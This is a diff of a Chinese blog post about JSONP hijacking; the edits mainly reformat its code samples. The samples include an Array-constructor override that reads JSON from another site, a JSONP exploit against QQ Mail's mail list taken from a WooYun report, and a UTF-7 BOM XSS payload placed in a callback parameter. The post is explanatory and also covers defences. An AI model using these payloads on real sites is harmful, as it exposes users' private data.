@@ -50,7 +50,9 @@ tags:
 </span>
 ``` 
 script = document.createElement('script');
+
 script.type = 'text/javascript';
+
 script.src = 'http://www.someWebApiServer.com/some-data';</td>
 ``` 
 
@@ -66,7 +68,9 @@ script.src = 'http://www.someWebApiServer.com/some-data';</td>
 
 ```
 script = document.createElement('script');
+
 script.type = 'text/javascript';
+
 script.src = 'http://www.someWebApiServer.com/some-data?callback=my_callback';</td>
 ``` 
 
@@ -184,11 +188,8 @@ $('#twitterFeed').html(text);
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">**对象的攻击方式
 **</span>
-<div>
-<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
-<tbody valign="top">
-<tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><html>
+``` 
+<html>
 
 ...
 
@@ -204,25 +205,18 @@ Object.prototype.__defineSetter__('Id', function(obj){alert(obj);});
 
 </body>
 
-</html></td>
-</tr>
-</tbody>
-</table>
-</div>
+</html>
+``` 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">其中用到了Javascript的原型，如果对Javascript的原型不够熟悉，可以参考之前的文章[《【编程语言】深刻理解javascript原型（_proto_）》](http://helloword.1kapp.com/archives/1056)
 </span>
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">**数组的攻击方式
 **</span>
-<div>
-<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
-<tbody valign="top">
-<tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><script type="text/javascript">
+``` 
+
+<script type="text/javascript">
 
 var secrets;
-
-&nbsp;
 
 Array = function() {
 
@@ -235,8 +229,6 @@ secrets = this;
 <script src="http://haacked.com/demos/secret-info.json"
 
 type="text/javascript"></script>
-
-&nbsp;
 
 <script type="text/javascript">
 
@@ -252,18 +244,15 @@ yourData += secrets[i] + ' ';
 
 alert('I stole your data: ' + yourData);
 
-</script></td>
-</tr>
-</tbody>
-</table>
-</div>
+</script>
+
+``` 
+
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">下面举一个实际的例子，通过构造URL让用户访问，可以获得QQ Mail的邮件列表。该漏洞由于需要在web QQ里共享QQ Mail里的邮件信息，所以QQ Mail开放了一个json接口以提供第三方的域名来获得QQ Mail的信息，但是由于该接口缺乏足够的认证，所以导致任何第三方域里都可以用script的方式来获取该邮件列表。[WooYun: QQMail邮件泄露漏洞](http://www.wooyun.org/bugs/wooyun-2010-046) 详见地址http://www.wooyun.org/bugs/wooyun-2010-046
 </span>
-<div>
-<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
-<tbody valign="top">
-<tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><script>
+``` 
+
+<script>
 
 var Qmail={};
 
@@ -279,11 +268,8 @@ alert(document.scripts[1].src=Qmail.newMailsList.nextUrl);
 
 alert(Qmail.newMailsList.summary);
 
-</script></td>
-</tr>
-</tbody>
-</table>
-</div>
+</script>
+``` 
 
 ## 4.漏洞防御:
 
@@ -302,19 +288,16 @@ alert(Qmail.newMailsList.summary);
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">这样的防御机制是比较传统的攻防思维，对输出点进行 xss 过滤。又是一个看上去很完美的解决方案，但是往往都是"事与愿违"。当年( 2011 年)一个 utf7-BOM 就复活了 n 个 XSS 漏洞。这种攻击方式主要还是存在与 IE 里(注在 IE 较新版本里已经"修复") 也就是当我们在 callback 点输出 +/v8 这样的 utf7-BOM 的时候， IE 浏览器会把当前执行的编码认为是 utf7 ,所以我们通过 utf7 提交的 XSS 代码会被自动解码并执行。如：
 </span>
 
-<div>
-<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
-<tbody valign="top">
-<tr>
-<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;">http://127.0.0.1/getUsers.php?callback=%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-%20其中：%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-%20URLdecode 为：+/v8+ADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-</td>
-</tr>
-</tbody>
-</table>
-</div>
+``` 
+ http://127.0.0.1/getUsers.php?callback=%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-%20其中：      %2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-%20URLdecode 为：+/v8+ADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8AaAB0AG0APg-
+``` 
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">其中 +/v8  为 utf7-BOM ，后面的为我们注入的 utf-7 编码后的 XSS 代码的：
-<htm><body><script>alert(1);</script></body></htm>
-</span>
+``` 
+
+<script>alert(1);</script>
+
+``` 
 
 ## 4.总结与思考:<span style="font-family: 宋体;">
 </span>
